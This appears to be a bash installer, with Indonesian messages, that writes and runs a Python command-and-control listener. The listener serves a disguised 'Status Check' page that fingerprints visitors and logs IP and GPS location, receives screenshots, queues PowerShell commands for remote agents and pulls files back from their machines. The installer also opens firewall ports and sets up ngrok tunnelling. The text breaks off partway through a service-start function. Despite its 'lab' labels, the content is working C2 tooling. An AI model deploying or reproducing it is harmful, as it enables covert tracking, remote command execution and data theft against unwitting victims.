set -e

PORT="${C2_PORT:-${PORT:-8080}}"
LOG_DIR="./received_logs"
SCRIPT_NAME="c2_listener.py"
SERVER_LOG="c2_server.log"
NGROK_AUTH_TOKEN="${NGROK_AUTH_TOKEN:-}"

if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
else
    SUDO="sudo"
fi

echo "=================================================================="
echo " [*] Initializing C2 Server Setup"
echo "=================================================================="

echo " [*] Checking dependencies (Python 3)..."
if ! command -v python3 &> /dev/null; then
    echo " [!] Python3 is required but not installed."
    if command -v apt-get &> /dev/null; then
        echo " [!] Installing via apt-get..."
        $SUDO apt-get update && $SUDO apt-get install -y python3 python3-pip
    else
        echo " [!] Install Python 3 manually, then re-run this script."
        exit 1
    fi
else
    echo " [+] Python3 is already installed."
fi

mkdir -p "$LOG_DIR"
echo " [+] Created log storage directory: $LOG_DIR"

echo " [*] Writing listener script to $SCRIPT_NAME..."

cat << 'EOF' > "$SCRIPT_NAME"
import http.server
import urllib.parse
import urllib.request
import json
import ipaddress
import os
import socket
import base64
import time
import random
from datetime import datetime

PORT = int(os.environ.get("C2_PORT", "8080"))
LOG_DIR = os.environ.get("C2_LOG_DIR", "./received_logs")
DASH_PASS = os.environ.get("C2_DASH_PASS", "")
VERSION = "3"

EVENTS_FILE = os.path.join(LOG_DIR, "events.jsonl")
COMMANDS_FILE = os.path.join(LOG_DIR, "commands.jsonl")
DASHBOARD_PATH = "/dashboard"
API_EVENTS_PATH = "/api/events"
EXPORT_PATH = "/export"
REMOTE_PATH = "/remote"
CMD_PATH = "/cmd"
RESULT_PATH = "/result"

events = []
loc_cache = {}
addr_cache = {}
gps_cache = {}
commands = []
done_cids = set()


def reverse_geocode(lat, lon):
    if not lat or not lon:
        return ""
    key = f"{lat},{lon}"
    if key in addr_cache:
        return addr_cache[key]
    address = ""
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1&accept-language=id"
        req = urllib.request.Request(url, headers={"User-Agent": "c2-lab-monitor/1.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            info = json.loads(resp.read().decode("utf-8"))
        ad = info.get("address", {})
        parts = []
        for k in ("road", "neighbourhood", "suburb", "village", "town", "city", "county", "state", "country"):
            if ad.get(k):
                parts.append(ad[k])
        seen = []
        for p in parts:
            if p not in seen:
                seen.append(p)
        address = ", ".join(seen)
        if not address:
            address = info.get("display_name", "").split(",")[:4]
    except Exception:
        address = ""
    addr_cache[key] = address
    return address


def emit(text):
    print(text, flush=True)


def now_str():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def file_ts():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")


def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def load_events():
    if not os.path.exists(EVENTS_FILE):
        return
    try:
        with open(EVENTS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    events.append(json.loads(line))
                except ValueError:
                    pass
    except Exception:
        pass


def record_event(ev):
    events.append(ev)
    try:
        with open(EVENTS_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(ev, ensure_ascii=False) + "\n")
    except Exception as e:
        emit(f" [!] Gagal menulis events.jsonl: {e}")


def _geolocate(client_ip):
    try:
        addr = ipaddress.ip_address(client_ip)
    except ValueError:
        return f"IP tidak valid: {client_ip}"
    if addr.is_private:
        return "Local network (IP privat, tidak bisa di-geolocate)"
    if addr.is_link_local or addr.is_reserved:
        return "Alamat reserved/link-local (tidak bisa di-geolocate)"
    try:
        start = int(ipaddress.ip_address("100.64.0.0"))
        end = int(ipaddress.ip_address("100.127.255.255"))
        if start <= int(addr) <= end:
            return "VPN/CGNAT (100.64.0.0/10, tidak bisa di-geolocate)"
    except ValueError:
        pass
    try:
        url = f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,lat,lon,isp,query"
        with urllib.request.urlopen(url, timeout=8) as resp:
            info = json.loads(resp.read().decode("utf-8"))
        if info.get("status") == "success":
            lat, lon = info.get("lat"), info.get("lon")
            addr = reverse_geocode(lat, lon)
            city = info.get("city") or info.get("regionName") or info.get("country")
            base = f"{city}, {info.get('regionName')}, {info.get('country')} ({lat}, {lon})"
            if addr:
                return f"{addr} | {base} - ISP: {info.get('isp')}"
            return f"{base} - ISP: {info.get('isp')}"
        return f"Gagal lookup: {info.get('message', 'no message')}"
    except Exception as e:
        return f"Error lookup: {e}"


def geolocate(client_ip):
    if client_ip not in loc_cache:
        loc_cache[client_ip] = _geolocate(client_ip)
    return loc_cache[client_ip]


def load_commands():
    global commands, done_cids
    if os.path.exists(COMMANDS_FILE):
        try:
            with open(COMMANDS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        commands.append(json.loads(line))
                    except ValueError:
                        pass
        except Exception:
            pass
    for ev in events:
        if ev.get("type") == "result" and ev.get("cid"):
            done_cids.add(ev["cid"])


def save_command(c):
    try:
        with open(COMMANDS_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(c, ensure_ascii=False) + "\n")
    except Exception as e:
        emit(f" [!] Gagal menyimpan command: {e}")


def pending_commands(machine):
    return [c for c in commands if c.get("machine") == machine and c.get("cid") not in done_cids]


def load_gps_cache():
    for ev in events:
        if ev.get("type") == "gps":
            d = ev.get("detail") or {}
            if d.get("lat") is not None and d.get("lon") is not None:
                entry = {"lat": d.get("lat"), "lon": d.get("lon"),
                         "accuracy": d.get("accuracy"), "address": d.get("address", "")}
                gps_cache["ip:" + ev.get("ip", "")] = entry
                if d.get("machine"):
                    gps_cache["id:" + d.get("machine")] = entry


def resolve_location(client_ip, machine):
    for key in (f"ip:{client_ip}", f"id:{machine}"):
        g = gps_cache.get(key)
        if g:
            if g.get("address"):
                return g["address"] + " (GPS)"
            return f"GPS: {g.get('lat')}, {g.get('lon')}"
    return geolocate(client_ip)


TRACKER_PAGE = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Status Check</title>
<script>
function sendFingerprint() {
    var nav = navigator;
    var data = {
        "user_agent": nav.userAgent,
        "platform": nav.platform || (nav.userAgentData && nav.userAgentData.platform) || "",
        "cpu_cores": nav.hardwareConcurrency || "",
        "memory_gb": nav.deviceMemory || "",
        "language": nav.language,
        "languages": (nav.languages || []).join(","),
        "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "screen": screen.width + "x" + screen.height,
        "color_depth": screen.colorDepth,
        "cookies_enabled": nav.cookieEnabled,
        "referrer": document.referrer,
        "timestamp": new Date().toISOString()
    };
    var payload = encodeURIComponent(JSON.stringify(data));
    fetch("/?id=beacon", {
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: "data=" + payload
    }).catch(function(){});
}
sendFingerprint();
</script>
</head>
<body>
<h1>Status: Connected</h1>
</body>
</html>"""

DASHBOARD_PAGE = r"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>C2 Monitor - Dashboard (v3)</title>
<style>
body { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; background:#0f172a; color:#e2e8f0; margin:0; padding:24px; }
h1 { font-size:20px; margin:0 0 4px; }
h2 { font-size:15px; margin:0 0 4px; }
.sub { color:#94a3b8; font-size:12px; margin-bottom:20px; }
.stats { display:flex; gap:12px; flex-wrap:wrap; margin-bottom:20px; }
.card { background:#1e293b; border:1px solid #334155; border-radius:8px; padding:14px 20px; min-width:120px; }
.card .n { font-size:26px; font-weight:700; color:#38bdf8; }
.card .l { font-size:11px; color:#94a3b8; text-transform:uppercase; letter-spacing:.06em; }
table { width:100%; border-collapse:collapse; background:#1e293b; border-radius:8px; overflow:hidden; }
th, td { text-align:left; padding:10px 12px; font-size:13px; border-bottom:1px solid #334155; vertical-align:top; }
th { background:#0b1220; color:#94a3b8; font-size:11px; text-transform:uppercase; }
tr:hover td { background:#24324a; }
.badge { padding:2px 8px; border-radius:999px; font-size:11px; white-space:nowrap; }
.b-click { background:#3b2f0a; color:#facc15; }
.b-data { background:#0f3a2e; color:#34d399; }
.b-shot { background:#3b1457; color:#e879f9; }
.b-gps { background:#0a3d5c; color:#38bdf8; }
.b-result { background:#2d1050; color:#c084fc; }
.detail { max-width:420px; word-break:break-all; color:#cbd5e1; font-size:12px; }
a { color:#38bdf8; }
b { color:#c084fc; }
hr { border:0; border-top:1px solid #334155; margin:28px 0; }
.remote { display:flex; gap:20px; flex-wrap:wrap; align-items:flex-start; }
.remote .panel { background:#1e293b; border:1px solid #334155; border-radius:8px; padding:18px; }
.remote .left { flex:1; min-width:280px; }
.remote .right { flex:2; min-width:340px; }
label { font-size:11px; color:#94a3b8; text-transform:uppercase; letter-spacing:.06em; display:block; margin:12px 0 4px; }
input[type=text], textarea { width:100%; background:#0b1220; color:#e2e8f0; border:1px solid #334155; border-radius:6px; padding:10px; font:13px ui-monospace, Menlo, monospace; box-sizing:border-box; }
textarea { min-height:110px; resize:vertical; }
button { background:#38bdf8; color:#0f172a; border:0; border-radius:6px; padding:10px 18px; font-weight:700; cursor:pointer; margin-top:12px; }
button:hover { background:#7dd3fc; }
.q { display:inline-block; background:#0b1220; border:1px solid #334155; color:#7dd3fc; border-radius:999px; padding:4px 10px; font-size:11px; cursor:pointer; margin:6px 4px 0 0; white-space:nowrap; }
.q:hover { background:#1e293b; }
pre { background:#0b1220; border:1px solid #334155; border-radius:6px; padding:10px; font-size:12px; overflow:auto; max-height:240px; white-space:pre-wrap; word-break:break-all; margin:6px 0 0; }
</style>
</head>
<body>
<h1>C2 Monitor <span style="font-size:12px;color:#94a3b8">v3</span></h1>
<div class="sub" id="sub">Memuat...</div>
<div class="stats">
<div class="card"><div class="n" id="sTotal">0</div><div class="l">Total Event</div></div>
<div class="card"><div class="n" id="sClick">0</div><div class="l">Klik Link</div></div>
<div class="card"><div class="n" id="sData">0</div><div class="l">Paket Data</div></div>
<div class="card"><div class="n" id="sShot">0</div><div class="l">Screenshot</div></div>
<div class="card"><div class="n" id="sIP">0</div><div class="l">IP Unik</div></div>
<div class="card"><div class="n" id="sLast">-</div><div class="l">Aktivitas Terakhir</div></div>
</div>
<table>
<thead><tr><th>Waktu</th><th>Jenis</th><th>IP</th><th>ID</th><th>Lokasi</th><th>Detail</th></tr></thead>
<tbody id="rows"></tbody>
</table>
<div class="sub" style="margin-top:16px">Auto-refresh 3 detik. Menampilkan 100 event terbaru. <a id="exportLink" href="/export">Export semua log</a></div>

<hr>
<h2 id="remote">Remote Access - Isi Mesin Lab</h2>
<div class="sub">Agent menjalankan perintah di PowerShell mesin lab. Format khusus: <b>GETFILE C:\path\file</b> untuk mengunduh file ke server.</div>
<div class="remote">
<div class="panel left">
  <label>ID Mesin</label>
  <input type="text" id="machine" value="win-lab-1">
  <label>Perintah (PowerShell)</label>
  <textarea id="cmd" placeholder="whoami"></textarea>
  <div>
    <span class="q">whoami</span><span class="q">ipconfig</span><span class="q">dir C:\</span>
    <span class="q">Get-Process | Sort-Object CPU -Descending | Select-Object -First 10</span>
    <span class="q">systeminfo</span>
    <span class="q">GETFILE C:\Users\lab\Desktop\catatan.txt</span>
  </div>
  <button onclick="sendCmd()">Kirim Perintah</button>
  <div class="sub" id="status" style="margin-top:10px"></div>
</div>
<div class="panel right">
  <label>Hasil Perintah</label>
  <table><thead><tr><th>Waktu</th><th>Mesin</th><th>Hasil</th></tr></thead><tbody id="cmdRows"></tbody></table>
</div>
</div>

<script>
var Q = location.search;
function esc(s) {
    return String(s == null ? "" : s).replace(/[&<>"']/g, function(c) {
        return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];
    });
}
async function refresh() {
    try {
        var r = await fetch("/api/events" + Q);
        if (!r.ok) { document.getElementById("sub").textContent = "Akses ditolak / pass salah"; return; }
        var ev = await r.json();
        render(ev);
    } catch(e) { document.getElementById("sub").textContent = "Server belum merespon..."; }
}
function render(ev) {
    document.getElementById("sub").textContent = "Terkoneksi - " + ev.length + " event";
    document.getElementById("sTotal").textContent = ev.length;
    var clicks = 0, datas = 0, shots = 0, ips = {}, last = ev.length ? ev[0].time : "-";
    for (var i = 0; i < ev.length; i++) {
        if (ev[i].type === "click") clicks++;
        else if (ev[i].type === "screenshot") shots++;
        else datas++;
        ips[ev[i].ip] = 1;
    }
    document.getElementById("sClick").textContent = clicks;
    document.getElementById("sData").textContent = datas;
    document.getElementById("sShot").textContent = shots;
    document.getElementById("sIP").textContent = Object.keys(ips).length;
    document.getElementById("sLast").textContent = last;
    var rows = document.getElementById("rows");
    rows.innerHTML = "";
    var slice = ev.slice(0, 100);
    for (var j = 0; j < slice.length; j++) {
        var e = slice[j];
        var badge, detail = "";
        if (e.type === "click") {
            badge = '<span class="badge b-click">Klik</span>';
            detail = "Path: " + esc(e.path);
        } else if (e.type === "gps") {
            badge = '<span class="badge b-gps">GPS</span>';
            var acc = e.detail && e.detail.accuracy != null ? " (~" + e.detail.accuracy + "m)" : "";
            detail = esc(e.detail.address || (e.detail.lat + ", " + e.detail.lon)) + acc;
        } else if (e.type === "screenshot") {
            badge = '<span class="badge b-shot">Screenshot</span>';
            var kb = e.detail && e.detail.size_kb != null ? e.detail.size_kb + " KB" : "";
            detail = kb + ' <a href="/screenshot/' + encodeURIComponent(e.file.split("/").pop()) + '" target="_blank">lihat gambar</a>';
        } else if (e.type === "result") {
            badge = '<span class="badge b-result">Hasil</span>';
            var dd = e.detail || {};
            var dl = dd.file_name ? ' <a href="/file/' + encodeURIComponent(dd.file_name) + '" download>unduh</a>' : "";
            detail = esc(dd.cmd || e.cid || "") + dl;
        } else {
            badge = '<span class="badge b-data">Data</span>';
            try { detail = esc(JSON.stringify(e.detail).slice(0, 300)); }
            catch(x) { detail = esc(String(e.detail)); }
        }
        var tr = document.createElement("tr");
        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + badge + "</td><td>" + esc(e.ip) + "</td><td>" + esc(e.id) + "</td><td>" + esc(e.location) + "</td><td class='detail'>" + detail + "</td>";
        rows.appendChild(tr);
    }
    var cmdRows = document.getElementById("cmdRows");
    cmdRows.innerHTML = "";
    var list = ev.filter(function(e) { return e.type === "result"; });
    for (var k = 0; k < list.length; k++) {
        var e = list[k];
        var d = e.detail || {};
        var dl = d.file_name ? ' <a href="/file/' + encodeURIComponent(d.file_name) + '" download>unduh</a>' : "";
        var tr = document.createElement("tr");
        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + esc(e.id) + "</td><td><b>" + esc(d.cmd || e.cid || "") + "</b>" + dl + "<pre>" + esc(d.output || "") + "</pre></td>";
        cmdRows.appendChild(tr);
    }
}
document.getElementById("exportLink").href = "/export" + Q;
document.querySelectorAll(".q").forEach(function(el) {
    el.addEventListener("click", function() { document.getElementById("cmd").value = el.textContent; });
});
async function sendCmd() {
    var machine = document.getElementById("machine").value.trim();
    var cmd = document.getElementById("cmd").value.trim();
    if (!cmd) { return; }
    var st = document.getElementById("status");
    st.textContent = "Mengirim...";
    var body = "machine=" + encodeURIComponent(machine) + "&cmd=" + encodeURIComponent(cmd) + Q.replace("?", "&");
    try {
        var r = await fetch("/cmd", {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: body});
        st.textContent = r.ok ? "Terkirim! Agent akan menjalankan dalam beberapa detik." : "Gagal kirim: " + r.status;
    } catch(e) { st.textContent = "Server tidak merespon."; }
}
refresh();
setInterval(refresh, 3000);
</script>
</body>
</html>"""


class C2Handler(http.server.BaseHTTPRequestHandler):

    def _send(self, code, ctype, body, extra_headers=None):
        self.send_response(code)
        self.send_header("Content-type", ctype)
        if extra_headers:
            for k, v in extra_headers:
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _auth_ok(self, query):
        if not DASH_PASS:
            return True
        return query.get("pass", [""])[0] == DASH_PASS

    def real_client_ip(self):
        direct = self.client_address[0]
        if direct in ("127.0.0.1", "::1", "localhost"):
            forwarded = self.headers.get("X-Forwarded-For", "")
            if forwarded:
                return forwarded.split(",")[0].strip()
            real = self.headers.get("X-Real-IP", "")
            if real:
                return real.strip()
        return direct

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        path = parsed.path

        if path in (DASHBOARD_PATH, API_EVENTS_PATH, EXPORT_PATH, REMOTE_PATH):
            if not self._auth_ok(query):
                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: pass salah")
                return
            if path == DASHBOARD_PATH:
                self._send(200, "text/html; charset=utf-8", DASHBOARD_PAGE.encode("utf-8"))
            elif path == REMOTE_PATH:
                dest = DASHBOARD_PATH + (("?" + parsed.query) if parsed.query else "")
                self.send_response(302)
                self.send_header("Location", dest)
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            elif path == API_EVENTS_PATH:
                body = json.dumps(list(reversed(events)), ensure_ascii=False).encode("utf-8")
                self._send(200, "application/json; charset=utf-8", body, [("Cache-Control", "no-store")])
            else:
                lines = [json.dumps(e, ensure_ascii=False) for e in reversed(events)]
                body = ("\n".join(lines) + "\n").encode("utf-8")
                self._send(200, "text/plain; charset=utf-8", body,
                           [("Content-Disposition", 'attachment; filename="logs.txt"')])
            return

        if path == CMD_PATH:
            machine = query.get("id", [""])[0] or "-"
            key = query.get("key", [""])[0]
            if DASH_PASS and key != DASH_PASS:
                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: key salah")
                return
            body = json.dumps(pending_commands(machine), ensure_ascii=False).encode("utf-8")
            self._send(200, "application/json; charset=utf-8", body, [("Cache-Control", "no-store")])
            return

        if path.startswith("/file/"):
            if not self._auth_ok(query):
                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: pass salah")
                return
            name = os.path.basename(path.split("/", 2)[2])
            fpath = os.path.join(LOG_DIR, name)
            if name.startswith("agentfile_") and os.path.isfile(fpath):
                try:
                    with open(fpath, "rb") as f:
                        self._send(200, "application/octet-stream", f.read(),
                                   [("Content-Disposition", 'attachment; filename="' + name + '"')])
                    return
                except Exception:
                    pass
            self._send(404, "text/plain; charset=utf-8", b"File tidak ditemukan")
            return

        if path.startswith("/screenshot/"):
            if not self._auth_ok(query):
                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: pass salah")
                return
            name = os.path.basename(path.split("/", 2)[2])
            fpath = os.path.join(LOG_DIR, name)
            if name.startswith("screenshot_") and os.path.isfile(fpath):
                try:
                    with open(fpath, "rb") as f:
                        self._send(200, "image/png", f.read(), [("Cache-Control", "no-store")])
                    return
                except Exception:
                    pass
            self._send(404, "text/plain; charset=utf-8", b"Gambar tidak ditemukan")
            return

        client_ip = self.real_client_ip()
        t = now_str()
        tracking_id = query.get("id", [""])[0] or "-"
        location = resolve_location(client_ip, tracking_id)
        fname = os.path.join(LOG_DIR, f"click_{client_ip}_{file_ts()}.log")
        content = f"IP: {client_ip}\nWaktu: {t}\nPath: {parsed.path}\nID: {tracking_id}\nLokasi: {location}\n"
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(content)
        except Exception as e:
            emit(f" [!] Gagal simpan file: {e}")
        record_event({
            "time": t, "type": "click", "ip": client_ip, "id": tracking_id,
            "path": parsed.path, "location": location, "file": fname
        })
        emit("=" * 60)
        emit(" [+] LINK DIKLIK")
        emit(f"     Waktu : {t}")
        emit(f"     IP    : {client_ip}")
        emit(f"     ID    : {tracking_id}")
        emit(f"     Lokasi: {location}")
        emit(f"     Path  : {parsed.path}")
        emit(f"     File  : {fname}")
        emit("=" * 60)
        self._send(200, "text/html; charset=utf-8", TRACKER_PAGE.encode("utf-8"))

    def do_POST(self):
        try:
            parsed = urllib.parse.urlparse(self.path)
            path = parsed.path
            parsed_query = urllib.parse.parse_qs(parsed.query)
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length).decode("utf-8", errors="ignore")
            parsed_data = urllib.parse.parse_qs(post_data)
            data_payload = parsed_data.get("data", [""])[0]
            if not data_payload:
                data_payload = post_data
            dtype = parsed_data.get("type", [""])[0]
            machine = parsed_query.get("id", [""])[0] or parsed_data.get("machine", [""])[0] or "-"
            client_ip = self.real_client_ip()
            t = now_str()

            if path == RESULT_PATH:
                machine = parsed_data.get("machine", [""])[0] or "-"
                cid = parsed_data.get("cid", [""])[0]
                output = parsed_data.get("output", [""])[0]
                key = parsed_data.get("key", [""])[0]
                if DASH_PASS and key != DASH_PASS:
                    self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: key salah")
                    return
                cmdtext = next((c.get("cmd", "") for c in commands if c.get("cid") == cid), cid)
                detail = {"cmd": cmdtext, "output": output[:8000]}
                fname = ""
                if parsed_data.get("data", [""])[0]:
                    try:
                        fbytes = base64.b64decode(parsed_data["data"][0])
                    except Exception:
                        fbytes = b""
                    orig = os.path.basename(parsed_data.get("data_name", ["file"])[0] or "file").replace(" ", "_")
                    stored = f"agentfile_{machine}_{orig}"
                    fname = os.path.join(LOG_DIR, stored)
                    try:
                        with open(fname, "wb") as f:
                            f.write(fbytes)
                        detail["file_name"] = stored
                        detail["orig_name"] = orig
                        detail["file_size"] = len(fbytes)
                    except Exception as e:
                        emit(f" [!] Gagal simpan file dari agent: {e}")
                record_event({
                    "time": t, "type": "result", "ip": client_ip, "id": machine, "cid": cid,
                    "path": "/", "location": resolve_location(client_ip, machine), "detail": detail, "file": fname
                })
                done_cids.add(cid)
                emit("=" * 60)
                emit(" [+] HASIL PERINTAH DITERIMA")
                emit(f"     Waktu : {t}")
                emit(f"     Mesin : {machine} | CID: {cid}")
                emit(f"     Perintah: {cmdtext}")
                if fname:
                    emit(f"     File  : {fname} ({detail.get('file_size', 0)} bytes)")
                emit(f"     Output:")
                emit(f"     {output[:800]}")
                emit("=" * 60)
                self._send(200, "text/plain; charset=utf-8", b"OK")
                return

            if path == CMD_PATH:
                machine = parsed_data.get("machine", [""])[0] or "-"
                cmdtext = parsed_data.get("cmd", [""])[0]
                key = parsed_data.get("key", [""])[0] or parsed_data.get("pass", [""])[0]
                if DASH_PASS and key != DASH_PASS:
                    self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: key salah")
                    return
                if not cmdtext:
                    self._send(400, "text/plain; charset=utf-8", b"Perintah kosong")
                    return
                cid = "%s_%d" % (time.strftime("%H%M%S"), random.randint(100, 999))
                c = {"cid": cid, "machine": machine, "cmd": cmdtext, "time": t}
                commands.append(c)
                save_command(c)
                emit("=" * 60)
                emit(" [+] PERINTAH DIANTRIKAN")
                emit(f"     Waktu : {t}")
                emit(f"     Mesin : {machine} | CID: {cid}")
                emit(f"     Perintah: {cmdtext}")
                emit("=" * 60)
                self._send(200, "application/json; charset=utf-8", json.dumps({"cid": cid}, ensure_ascii=False).encode("utf-8"))
                return

            if dtype == "gps":
                try:
                    detail = json.loads(data_payload)
                except ValueError:
                    detail = {"raw": data_payload}
                lat = detail.get("lat")
                lon = detail.get("lon")
                addr = reverse_geocode(lat, lon) if lat and lon else ""
                detail["machine"] = machine
                if lat is not None and lon is not None:
                    gps_cache["ip:" + client_ip] = {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr}
                    gps_cache["id:" + machine] = {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr}
                fname = os.path.join(LOG_DIR, f"gps_{client_ip}_{file_ts()}.log")
                try:
                    with open(fname, "w", encoding="utf-8") as f:
                        f.write(f"IP: {client_ip}\nWaktu: {t}\nLokasi GPS: {lat}, {lon} (akurasi {detail.get('accuracy')} m)\nAlamat: {addr}\n")
                except Exception as e:
                    emit(f" [!] Gagal simpan gps: {e}")
                record_event({
                    "time": t, "type": "gps", "ip": client_ip, "id": machine,
                    "path": "/", "location": addr or resolve_location(client_ip, machine),
                    "detail": {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr, "machine": machine}, "file": fname
                })
                emit("=" * 60)
                emit(" [+] GPS DITERIMA (dari browser)")
                emit(f"     Waktu  : {t}")
                emit(f"     IP     : {client_ip}")
                emit(f"     Lokasi : {lat}, {lon} (akurasi {detail.get('accuracy')} m)")
                emit(f"     Alamat : {addr or '(tidak ada alamat ter-reverse)'}")
                emit("=" * 60)
                self._send(200, "text/plain; charset=utf-8", b"ACK")
                return
            if dtype == "screenshot":
                fname = os.path.join(LOG_DIR, f"screenshot_{client_ip}_{file_ts()}.png")
                try:
                    png = base64.b64decode(data_payload)
                except Exception as e:
                    emit(f" [!] Gagal decode screenshot: {e}")
                    self._send(400, "text/plain; charset=utf-8", b"Bad screenshot")
                    return
                with open(fname, "wb") as f:
                    f.write(png)
                record_event({
                    "time": t, "type": "screenshot", "ip": client_ip, "id": machine,
                    "path": "/", "location": resolve_location(client_ip, machine),
                    "detail": {"bytes": len(png), "size_kb": round(len(png) / 1024, 1)}, "file": fname
                })
                emit("=" * 60)
                emit(" [+] SCREENSHOT DITERIMA")
                emit(f"     Waktu : {t}")
                emit(f"     IP    : {client_ip}")
                emit(f"     Ukuran: {len(png)} bytes ({round(len(png)/1024,1)} KB)")
                emit(f"     File  : {fname}")
                emit(f"     Lihat : /screenshot/{os.path.basename(fname)} (butuh auth dashboard)")
                emit("=" * 60)
                self._send(200, "text/plain; charset=utf-8", b"ACK")
                return
            fname = os.path.join(LOG_DIR, f"{client_ip}_{file_ts()}.log")
            with open(fname, "w", encoding="utf-8") as f:
                f.write(data_payload)
            try:
                detail = json.loads(data_payload)
            except ValueError:
                detail = data_payload
            record_event({
                "time": t, "type": "data", "ip": client_ip, "id": machine,
                "path": "/", "location": resolve_location(client_ip, machine), "detail": detail, "file": fname
            })
            emit("=" * 60)
            emit(" [+] PAKET DATA DITERIMA")
            emit(f"     Waktu : {t}")
            emit(f"     IP    : {client_ip}")
            emit(f"     File  : {fname}")
            emit("     Isi   :")
            emit(f"     {data_payload}")
            emit("=" * 60)
            self._send(200, "text/plain; charset=utf-8", b"ACK")
        except Exception as e:
            emit(f" [!] Error memproses request: {e}")
            self._send(500, "text/plain; charset=utf-8", b"Error")

    def log_message(self, format, *args):
        return


def main():
    os.makedirs(LOG_DIR, exist_ok=True)
    load_events()
    load_commands()
    load_gps_cache()
    server_address = ("", PORT)
    httpd = http.server.HTTPServer(server_address, C2Handler)
    ip = local_ip()
    emit("")
    emit("[*] C2 Listener v%s berjalan di port %d" % (VERSION, PORT))
    emit("[*] Folder log: %s" % os.path.abspath(LOG_DIR))
    emit("")
    emit("[*] LINK PELACAK (kirim ke mesin lab):")
    emit("    http://%s:%d/?id=lab-1" % (ip, PORT))
    emit("")
    emit("[*] DASHBOARD (monitoring + remote access dalam satu halaman):")
    suffix = "?pass=xxx" if DASH_PASS else ""
    emit("    http://%s:%d/dashboard%s" % (ip, PORT, suffix))
    emit("")
    emit("[*] Tekan Ctrl+C untuk menghentikan server.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        emit("\n[*] Server dihentikan.")
        httpd.server_close()


if __name__ == "__main__":
    main()
EOF

chmod +x "$SCRIPT_NAME"
echo " [+] Listener script generated and made executable."

echo " [*] Opening port $PORT in firewall..."
open_port() {
    if command -v ufw > /dev/null 2>&1; then
        $SUDO ufw allow "$PORT"/tcp > /dev/null 2>&1 && echo " [+] Port $PORT opened via ufw." || echo " [!] ufw rule failed to add (run 'sudo ufw enable' first?)."
        return 0
    fi
    if command -v firewall-cmd > /dev/null 2>&1; then
        $SUDO firewall-cmd --permanent --add-port="$PORT"/tcp > /dev/null 2>&1 || true
        $SUDO firewall-cmd --reload > /dev/null 2>&1 || true
        echo " [+] Port $PORT opened via firewalld."
        return 0
    fi
    if command -v iptables > /dev/null 2>&1; then
        if $SUDO iptables -C INPUT -p tcp --dport "$PORT" -j ACCEPT > /dev/null 2>&1; then
            echo " [+] Port $PORT rule already present (iptables)."
        else
            $SUDO iptables -A INPUT -p tcp --dport "$PORT" -j ACCEPT > /dev/null 2>&1 && echo " [+] Port $PORT opened via iptables." || echo " [!] iptables rule failed to add."
        fi
        return 0
    fi
    echo " [!] No firewall tool detected. If a firewall blocks $PORT, open it manually."
}
open_port

LISTENER_MODE="nohup"
if command -v systemctl > /dev/null 2>&1; then
    LISTENER_MODE="systemd"
fi

ensure_ngrok() {
    if ! command -v ngrok > /dev/null 2>&1; then
        echo " [*] ngrok belum terpasang..."
        if command -v apt-get > /dev/null 2>&1; then
            echo " [*] Memasang ngrok via apt..."
            curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | $SUDO tee /etc/apt/trusted.gpg.d/ngrok.asc > /dev/null 2>&1 || true
            echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | $SUDO tee /etc/apt/sources.list.d/ngrok.list > /dev/null 2>&1 || true
            $SUDO apt-get update > /dev/null 2>&1 || true
            $SUDO apt-get install -y ngrok > /dev/null 2>&1 || echo " [!] Gagal install ngrok via apt."
        else
            echo " [!] Install ngrok manual: https://ngrok.com/download"
        fi
    fi

    if [ -n "$NGROK_AUTH_TOKEN" ]; then
        ngrok config add-authtoken "$NGROK_AUTH_TOKEN" > /dev/null 2>&1 || true
        return 0
    fi
    if command -v ngrok > /dev/null 2>&1 && ngrok config check > /dev/null 2>&1; then
        return 0
    fi
    echo " [!] Authtoken ngrok belum ada. Salah satu cara:"
    echo "     1) Sekali saja di server:  ngrok config add-authtoken TOKEN_ANDA"
    echo "        (lalu curl | bash polos langsung pakai ngrok)"
    echo "     2) Atau setiap run:         curl -fsSL URL | NGROK_AUTH_TOKEN=TOKEN_ANDA bash"
    return 1
}

start_services() {
    local DO_NGROK="$1"
